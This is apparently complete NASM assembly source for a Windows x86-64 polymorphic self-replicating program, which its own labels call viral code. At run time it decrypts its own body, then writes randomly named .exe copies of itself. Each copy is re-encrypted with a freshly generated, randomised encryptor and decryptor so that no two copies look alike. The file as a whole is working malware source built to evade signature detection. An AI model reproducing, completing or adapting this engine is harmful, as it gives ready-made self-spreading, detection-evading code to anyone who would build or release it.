
cpu x86-64

extern VirtualProtect
extern GetTickCount
extern fopen
extern fclose
extern fseek
extern ftell
extern fread
extern fwrite
extern malloc
extern free
extern snprintf
extern memset
extern memcpy

%define NULL 0x00

; page protection modes
%define PAGE_EXECUTE           0x10
%define PAGE_EXECUTE_READ      0x20
%define PAGE_EXECUTE_READWRITE 0x40
%define PAGE_EXECUTE_WIRTECOPY 0x80
%define PAGE_NOACCESS          0x01
%define PAGE_READONLY          0x02
%define PAGE_READWRITE         0x03
%define PAGE_WRITECOPY         0x04

; defines from stdio.h
%define SEEK_SET 0
%define SEEK_CUR 1
%define SEEK_END 2

; the offset of the entry point in the executable file
%define EXE_ENTRY_POINT_OFFSET 0x00000B60

; the offset of the viral code in the executable file
%define EXE_VIRAL_CODE_OFFSET (EXE_ENTRY_POINT_OFFSET+(viral_code_begin-main))

; the offset of the decryptor section in the executable file
%define EXE_DECRYPTOR_OFFSET (EXE_ENTRY_POINT_OFFSET+(self_decrypt.decryptor_section-main))

; https://wiki.osdev.org/X86-64_Instruction_Encoding
;
; prefixes and opcodes of 12 invertible instructions:
;   Instructions | Inverted instructions
; - add reg, reg | - sub reg, reg
; - sub reg, reg | - add reg, reg
; - xor reg, reg | - xor reg, reg
; - add reg, i32 | - sub reg, i32
; - sub reg, i32 | - add reg, i32
; - xor reg, i32 | - xor reg, i32
; - rol reg, i8  | - ror reg, i8
; - ror reg, i8  | - rol reg, i8
; - inc reg      | - dec reg
; - dec reg      | - inc reg
; - not reg      | - not reg
; - neg reg      | - neg reg
%define OPCODE_NOP            0x90
%define OPCODE_ADD_RM         0x01
%define OPCODE_SUB_RM         0x29
%define OPCODE_XOR_RM         0x31
%define PREFIX_ADD_SUB_XOR_RI 0x81
%define OPCODE_ADD_RI         0xC0
%define OPCODE_SUB_RI         0xE8
%define OPCODE_XOR_RI         0xF0
%define PREFIX_ROL_ROR_RI     0xC1
%define OPCODE_ROL_RI         0xC0
%define OPCODE_ROR_RI         0xC8
%define PREFIX_INC_DEC_R      0xFF
%define OPCODE_INC_R          0xC0
%define OPCODE_DEC_R          0xC8
%define PREFIX_NOT_NEG_R      0xF7
%define OPCODE_NOT_R          0xD0
%define OPCODE_NEG_R          0xD8

; the size of the encryptor and the decryptor sections
%define ENC_DEC_SIZE 0x100

; encryptor/decryptor section
%macro ENC_DEC_SECTION 0
	times ENC_DEC_SIZE db OPCODE_NOP
%endmacro

section .data
	align 4
	lcg_x: dd 0
	align 4
	rb_mode: db "rb", NULL
	align 4
	wb_mode: db "wb", NULL
	align 4
	file_format: db "%08x.exe", NULL

	; the table of all the possible ModRegRM fields allowed
	; Note that the instructions are not distructive (e.g. sub eax, eax)
	;
	; Mod is always 11 because the are not memory references
	; Reg denotes the source register
	; RM denotes the destination register
	;
	; Mod | Reg | RM
	;  11 | xxx | yyy
	;
	; eax  | ecx
	; eax  | edx
	; eax  | ebx
	; ecx  | eax
	; ecx  | edx
	; ecx  | ebx
	; edx  | eax
	; edx  | ecx
	; edx  | ebx
	; ebx  | eax
	; ebx  | ecx
	; ebx  | edx
	align 4
	mod_reg_rm: db 0xC8, 0xD0, 0xD8, 0xC1, 0xD1, 0xD9, 0xC2, 0xCA, 0xDA, 0xC3, 0xCB, 0xD3

section .text

global main

; entry point
;
; [in] rcx : argc
; [in] rdx : argv
;
; shadow space
; [rbp+0x10] : rcx
;
main:
	push    rbp
	mov     rbp, rsp
	sub     rsp, 0x20
	; self decrypt the program
	mov     rcx, [rdx]
	mov     [rbp+0x10], rcx
	call    self_decrypt
	test    rax, rax
	jz      .epilogue
	; replicate itself
	mov     rcx, [rbp+0x10]
	call    replicate
.epilogue:
	mov     rsp, rbp
	pop     rbp
	ret

; linear congruential generator set seed
;
; [in] ecx : seed
;
lcg_seed:
	mov     [rel lcg_x], ecx
	ret

; linear congruential generator get random value
;
; https://en.wikipedia.org/wiki/Linear_congruential_generator
; M = 2^31
; A = 0x41C64E6D
; C = 0x3039
;
; eax : 32-bit random value
;
lcg_rand32:
	mov     ecx, 0x41C64E6D
	mov     eax, [rel lcg_x]
	mul     ecx
	add     eax, 0x3039
	and     eax, 0x7FFFFFFF
	mov     [rel lcg_x], eax
	ret

; decryption function
;
; rax : 0 if the function failed
;
self_decrypt:
	push    rbp
	push    rsi
	push    rdi
	mov     rbp, rsp
	sub     rsp, 0x30
	; unprotect the page from writing
	lea     rcx, [rel viral_code_begin]
	mov     rdx, viral_code_end - viral_code_begin
	mov     r8d, PAGE_EXECUTE_READWRITE
	lea     r9d, [rbp-0x4]
	call    VirtualProtect
	test    rax, rax
	jz      .epilogue
	lea     rsi, [rel viral_code_begin]
	lea     rdi, [rel viral_code_end  ]
.decryptor_loop:
	cmp     rsi, rdi
	je      .decryptor_end
	mov     eax, [rsi    ]
	mov     ecx, [rsi+0x4]
	mov     edx, [rsi+0x8]
	mov     ebx, [rsi+0xC]
.decryptor_section:
	ENC_DEC_SECTION
	mov     [rsi    ], eax
	mov     [rsi+0x4], ecx
	mov     [rsi+0x8], edx
	mov     [rsi+0xC], ebx
	add     rsi, 0x10
	jmp     .decryptor_loop
.decryptor_end:
	; protect the page from writing again
	lea     rcx, [rel viral_code_begin]
	mov     rdx, viral_code_end - viral_code_begin
	mov     r8d, [rbp-0x4]
	lea     r9d, [rbp-0x4]
	call    VirtualProtect
.epilogue:
	mov     rsp, rbp
	pop     rdi
	pop     rsi
	pop     rbp
	ret

; align the viral code to 16 bytes
; (this is necessary because the viral code section size must be a multiple of 16)
align 16
viral_code_begin:

; replication function
;
; [in] rcx : the filename of itself
;
replicate:
	push    rbp
	push    rbx
	push    rdi
	mov     rbp, rsp
	sub     rsp, 0x40
	; read the executable program of itself
	lea     rdx, [rbp-0x8]
	call    read_file_data
	test    rax, rax
	jz      .epilogue
	mov     rbx, rax
	; seed the random number generator
	call    GetTickCount
	mov     ecx, eax
	call    lcg_seed
	; call the polymorphic engine
	mov     rcx, rbx
	call    polymorphic_engine
	; generate filename of the copy
	call    lcg_rand32
	mov     r9d, eax
	lea     rcx, [rbp-0x20]
	mov     rdx, 0x20
	lea     r8, [rel file_format]
	call    snprintf
	; open the copy file
	lea     rcx, [rbp-0x20]
	lea     rdx, [rel wb_mode]
	call    fopen
	test    rax, rax
	jz      .buffer_free
	mov     rdi, rax
	; write the copy file
	mov     rcx, rbx
	mov     rdx, [rbp-0x8]
	mov     r8d, 1
	mov     r9, rdi
	call    fwrite
.file_close:
	; close the file
	mov     rcx, rdi
	call    fclose
.buffer_free:
	; free the data buffer
	mov     rcx, rbx
	call    free
.epilogue:
	mov     rsp, rbp
	pop     rdi
	pop     rbx
	pop     rbp
	ret

; polymorphic engine function
;
; [in] rcx : copy buffer pointer
;
; shadow space
; [rbp+0x40] : rcx
; [rbp+0x48] : old page protection mode
;
polymorphic_engine:
	push    rbp
	push    rsi
	push    rdi
	push    rbx
	push    r12
	push    r13
	mov     rbp, rsp
	and     rsp, -0x10
	sub     rsp, (0x20+(2*ENC_DEC_SIZE))
	mov     [rbp+0x40], rcx
	; initialize the encryptor and decryptor buffers
	lea     rsi, [rbp-(2*ENC_DEC_SIZE)]
	lea     rdi, [rbp]
	mov     rcx, rsi
	mov     rdx, OPCODE_NOP
	mov     r8, (2*ENC_DEC_SIZE)
	call    memset
	; generate the encryptor and the decryptor
	lea     rbx, [rsi+ENC_DEC_SIZE-0x6]
	lea     r12, [rel mod_reg_rm]
	mov     r13d, 0xC
.enc_dec_generation_loop:
	cmp     rsi, rbx
	ja      .enc_dec_generation_end
	call    lcg_rand32
	xor     edx, edx
	div     r13d
	jmp     [.instructions_table+rdx*8]
	align 8
	; the instructions table
	.instructions_table: dq .add_reg_reg,
	                     dq .sub_reg_reg,
	                     dq .xor_reg_reg,
	                     dq .add_reg_i32,
	                     dq .sub_reg_i32,
	                     dq .xor_reg_i32,
	                     dq .rol_reg_i8,
	                     dq .ror_reg_i8,
	                     dq .inc_reg,
	                     dq .dec_reg,
	                     dq .not_reg,
	                     dq .neg_reg
.add_reg_reg:
	sub     rdi, 0x2
	call    lcg_rand32
	xor     edx, edx
	div     r13d
	mov     al, [r12+rdx]
	mov     dh, al
	mov     ah, OPCODE_ADD_RM
	mov     dl, OPCODE_SUB_RM
	xchg    al, ah
	mov     [rsi], ax
	mov     [rdi], dx
	add     rsi, 0x2
	jmp     .enc_dec_generation_loop
.sub_reg_reg:
	sub     rdi, 0x2
	call    lcg_rand32
	xor     edx, edx
	div     r13d
	mov     al, [r12+rdx]
	mov     dh, al
	mov     ah, OPCODE_SUB_RM
	mov     dl, OPCODE_ADD_RM
	xchg    al, ah
	mov     [rsi], ax
	mov     [rdi], dx
	add     rsi, 0x2
	jmp     .enc_dec_generation_loop
.xor_reg_reg:
	sub     rdi, 0x2
	call    lcg_rand32
	xor     edx, edx
	div     r13d
	mov     al, [r12+rdx]
	mov     ah, OPCODE_XOR_RM
	xchg    al, ah
	mov     [rsi], ax
	mov     [rdi], ax
	add     rsi, 0x2
	jmp     .enc_dec_generation_loop
.add_reg_i32:
	sub     rdi, 0x6
	call    lcg_rand32
	mov     al, PREFIX_ADD_SUB_XOR_RI
	and     ah, 0x3
	mov     dx, ax
	or      ah, OPCODE_ADD_RI
	or      dh, OPCODE_SUB_RI
	mov     [rsi], ax
	mov     [rdi], dx
	call    lcg_rand32
	mov     [rsi+0x2], eax
	mov     [rdi+0x2], eax
	add     rsi, 0x6
	jmp     .enc_dec_generation_loop
.sub_reg_i32:
	sub     rdi, 0x6
	call    lcg_rand32
	mov     al, PREFIX_ADD_SUB_XOR_RI
	and     ah, 0x3
	mov     dx, ax
	or      ah, OPCODE_SUB_RI
	or      dh, OPCODE_ADD_RI
	mov     [rsi], ax
	mov     [rdi], dx
	call    lcg_rand32
	mov     [rsi+0x2], eax
	mov     [rdi+0x2], eax
	add     rsi, 0x6
	jmp     .enc_dec_generation_loop
.xor_reg_i32:
	sub     rdi, 0x6
	call    lcg_rand32
	mov     al, PREFIX_ADD_SUB_XOR_RI
	and     ah, 0x3
	or      ah, OPCODE_XOR_RI
	mov     [rsi], ax
	mov     [rdi], ax
	call    lcg_rand32
	mov     [rsi+0x2], eax
	mov     [rdi+0x2], eax
	add     rsi, 0x6
	jmp     .enc_dec_generation_loop
.rol_reg_i8:
	sub     rdi, 0x3
	call    lcg_rand32
	mov     al, PREFIX_ROL_ROR_RI
	and     ah, 0x3
	mov     dx, ax
	or      ah, OPCODE_ROL_RI
	or      dh, OPCODE_ROR_RI
	mov     [rsi], ax
	mov     [rdi], dx
	call    lcg_rand32
	and     al, 0x1F
	or      al, 0x1
	mov     [rsi+0x2], al
	mov     [rdi+0x2], al
	add     rsi, 0x3
	jmp     .enc_dec_generation_loop
.ror_reg_i8:
	sub     rdi, 0x3
	call    lcg_rand32
	mov     al, PREFIX_ROL_ROR_RI
	and     ah, 0x3
	mov     dx, ax
	or      ah, OPCODE_ROR_RI
	or      dh, OPCODE_ROL_RI
	mov     [rsi], ax
	mov     [rdi], dx
	call    lcg_rand32
	and     al, 0x1F
	or      al, 0x1
	mov     [rsi+0x2], al
	mov     [rdi+0x2], al
	add     rsi, 0x3
	jmp     .enc_dec_generation_loop
.inc_reg:
	sub     rdi, 0x2
	call    lcg_rand32
	mov     al, PREFIX_INC_DEC_R
	and     ah, 0x3
	mov     dx, ax
	or      ah, OPCODE_INC_R
	or      dh, OPCODE_DEC_R
	mov     [rsi], ax
	mov     [rdi], dx
	add     rsi, 0x2
	jmp     .enc_dec_generation_loop
.dec_reg:
	sub     rdi, 0x2
	call    lcg_rand32
	mov     al, PREFIX_INC_DEC_R
	and     ah, 0x3
	mov     dx, ax
	or      ah, OPCODE_DEC_R
	or      dh, OPCODE_INC_R
	mov     [rsi], ax
	mov     [rdi], dx
	add     rsi, 0x2
	jmp     .enc_dec_generation_loop
.not_reg:
	sub     rdi, 0x2
	call    lcg_rand32
	mov     al, PREFIX_NOT_NEG_R
	and     ah, 0x3
	or      ah, OPCODE_NOT_R
	mov     [rsi], ax
	mov     [rdi], ax
	add     rsi, 0x2
	jmp     .enc_dec_generation_loop
.neg_reg:
	sub     rdi, 0x2
	call    lcg_rand32
	mov     al, PREFIX_NOT_NEG_R
	and     ah, 0x3
	or      ah, OPCODE_NEG_R
	mov     [rsi], ax
	mov     [rdi], ax
	add     rsi, 0x2
	jmp     .enc_dec_generation_loop
.enc_dec_generation_end:
	; unprotect the page from writing
	lea     rcx, [rel viral_code_begin]
	mov     rdx, viral_code_end - viral_code_begin
	mov     r8d, PAGE_EXECUTE_READWRITE
	lea     r9d, [rbp+0x48]
	call    VirtualProtect
	test    rax, rax
	jz      .epilogue
	; copy the encryptor
	lea     rcx, [rel .encryptor_section]
	lea     rdx, [rbp-(2*ENC_DEC_SIZE)]
	mov     r8, ENC_DEC_SIZE
	call    memcpy
	; protect the page from writing again
	lea     rcx, [rel viral_code_begin]
	mov     rdx, viral_code_end - viral_code_begin
	mov     r8d, [rbp+0x48]
	lea     r9d, [rbp+0x48]
	call    VirtualProtect
	test    rax, rax
	jz      .epilogue
	; encrypt the copy executable
	lea     rsi, [rel viral_code_begin]
	lea     r8,  [rel viral_code_end]
	mov     rdi, [rbp+0x40]
	add     rdi, EXE_VIRAL_CODE_OFFSET
.encryptor_loop:
	cmp     rsi, r8
	je      .encryptor_end
	mov     eax, [rsi    ]
	mov     ecx, [rsi+0x4]
	mov     edx, [rsi+0x8]
	mov     ebx, [rsi+0xC]
.encryptor_section:
	ENC_DEC_SECTION
	mov     [rdi    ], eax
	mov     [rdi+0x4], ecx
	mov     [rdi+0x8], edx
	mov     [rdi+0xC], ebx
	add     rsi, 0x10
	add     rdi, 0x10
	jmp     .encryptor_loop
.encryptor_end:
	; place the decryptor of the copy program
	mov     rcx, [rbp+0x40]
	add     rcx, EXE_DECRYPTOR_OFFSET
	lea     rdx, [rbp-ENC_DEC_SIZE]
	mov     r8, ENC_DEC_SIZE
	call    memcpy
.epilogue:
	mov     rsp, rbp
	pop     r13
	pop     r12
	pop     rbx
	pop     rdi
	pop     rsi
	pop     rbp
	ret

; read an entire file
;
; [in]  rcx : filename
; [out] rdx : data buffer size
;
; rax : data buffer pointer
;
; shadow space
; [rbp+0x30] : rdx
;
read_file_data:
	push    rbp
	push    rbx
	push    rsi
	push    rdi
	push    r12
	mov     rbp, rsp
	sub     rsp, 0x20
	mov     [rbp+0x30], rdx
	xor     rdi, rdi
	; open the file
	lea     rdx, [rel rb_mode]
	call    fopen
	test    rax, rax
	jz      .epilogue
	mov     rsi, rax
	; move the file pointer to the end of the file
	mov     rcx, rax
	xor     rdx, rdx
	mov     r8d, SEEK_END
	call    fseek
	; get the file size
	mov     rcx, rsi
	call    ftell
	mov     rbx, rax
	; move the file pointer at the begin of the file
	mov     rcx, rsi
	xor     rdx, rdx
	mov     r8d, SEEK_SET
	call    fseek
	; allocate the data buffer
	mov     rcx, rbx
	call    malloc
	mov     rdi, rax
	test    rax, rax
	jz      .file_close
	; read the file
	mov     rcx, rdi
	mov     rdx, rbx
	mov     r8d, 1
	mov     r9, rsi
	call    fread
	test    rax, rax
	jz      .buffer_free
	; set the data buffer size
	mov     r12, [rbp+0x30]
	mov     [r12], rbx
	jmp     .file_close
.buffer_free:
	; free the buffer
	mov     rcx, rdi
	call    free
	xor     rdi, rdi
.file_close:
	; close the file
	mov     rcx, rsi
	call    fclose
	mov     rax, rdi
.epilogue:
	mov     rsp, rbp
	pop     r12
	pop     rdi
	pop     rsi
	pop     rbx
	pop     rbp
	ret

align 16
viral_code_end:

